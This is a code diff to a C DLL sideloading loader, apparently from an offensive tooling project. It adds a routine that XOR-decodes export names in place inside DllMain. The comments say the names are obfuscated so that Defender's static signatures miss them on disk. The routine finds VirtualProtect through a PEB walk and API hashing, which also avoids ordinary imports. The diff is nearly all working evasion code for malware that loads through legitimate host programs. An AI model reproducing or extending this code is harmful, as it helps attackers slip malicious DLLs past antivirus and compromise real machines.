@@ -395,6 +395,69 @@ static VOID NTAPI SideloadWorker(PVOID Instance, PVOID Context, PVOID Work) {
 }
 
 // -----------------------------------------------
+// DecryptExportNames — called at the very top of
+// DllMain before returning to the loader.
+//
+// SideloadGen.py XOR-obfuscates export names that
+// carry static AV signatures (e.g. APIExportForDetours).
+// The XOR'd bytes are what Defender scans on disk.
+// The PE loader snaps the host's IAT *after* DllMain
+// returns, so decoding here makes the real name
+// visible exactly when the loader needs it.
+//
+// Uses VirtualProtect (resolved via PEB/hash walk —
+// no InitializeWinApis needed) to temporarily make
+// the .rdata export-name bytes writable.
+// -----------------------------------------------
+#if SIDELOAD_EXPORT_PATCH_COUNT > 0
+static VOID DecryptExportNames(HINSTANCE hDll) {
+    PVOID pK32 = FindLoadedModuleW(L"KERNEL32.DLL");
+    if (!pK32) return;
+    fnVirtualProtect pVP =
+        (fnVirtualProtect)FetchExportAddress(pK32, VirtualProtect_JOAAT);
+    if (!pVP) return;
+
+    BYTE* base = (BYTE*)hDll;
+    IMAGE_DOS_HEADER* dos = (IMAGE_DOS_HEADER*)base;
+    if (dos->e_magic != IMAGE_DOS_SIGNATURE) return;
+    IMAGE_NT_HEADERS* nt =
+        (IMAGE_NT_HEADERS*)(base + dos->e_lfanew);
+    if (nt->Signature != IMAGE_NT_SIGNATURE) return;
+
+    DWORD expRva = nt->OptionalHeader
+                     .DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT]
+                     .VirtualAddress;
+    if (!expRva) return;
+
+    IMAGE_EXPORT_DIRECTORY* exp =
+        (IMAGE_EXPORT_DIRECTORY*)(base + expRva);
+    DWORD* nameRvas = (DWORD*)(base + exp->AddressOfNames);
+
+    static const char* const sPatchXored[] = SIDELOAD_EXPORT_PATCH_XORED_NAMES;
+    static const int          sPatchLens[]  = SIDELOAD_EXPORT_PATCH_LENS;
+
+    for (DWORD i = 0; i < exp->NumberOfNames; i++) {
+        char* name = (char*)(base + nameRvas[i]);
+        for (int p = 0; p < SIDELOAD_EXPORT_PATCH_COUNT; p++) {
+            int   len   = sPatchLens[p];
+            const char* xored = sPatchXored[p];
+            int   match = 1;
+            for (int c = 0; c < len; c++) {
+                if (name[c] != xored[c]) { match = 0; break; }
+            }
+            if (match && name[len] == '\0') {
+                DWORD oldProt = 0;
+                pVP(name, (SIZE_T)len, PAGE_READWRITE, &oldProt);
+                for (int c = 0; c < len; c++)
+                    name[c] = (char)(((unsigned char)name[c]) ^ SIDELOAD_EXPORT_PATCH_KEY);
+                pVP(name, (SIZE_T)len, oldProt, &oldProt);
+            }
+        }
+    }
+}
+#endif /* SIDELOAD_EXPORT_PATCH_COUNT > 0 */
+
+// -----------------------------------------------
 // DllMain - DLL entry point for sideloading
 //
 // Minimal: find ntdll, queue worker, return.
@@ -406,6 +469,13 @@ BOOL WINAPI DllMain(HINSTANCE hDll, DWORD dwReason, LPVOID lpReserved) {
 
     if (dwReason != DLL_PROCESS_ATTACH)
         return TRUE;
+
+    // --- Decrypt XOR-obfuscated export names in place ---
+    // Must happen before returning: the loader snaps the host's IAT from
+    // our export table immediately after DllMain returns.
+#if SIDELOAD_EXPORT_PATCH_COUNT > 0
+    DecryptExportNames(hDll);
+#endif
 
     // --- Find ntdll base via PEB (case-insensitive) ---
     g_pNtdll = FindLoadedModuleW(L"NTDLL.DLL");
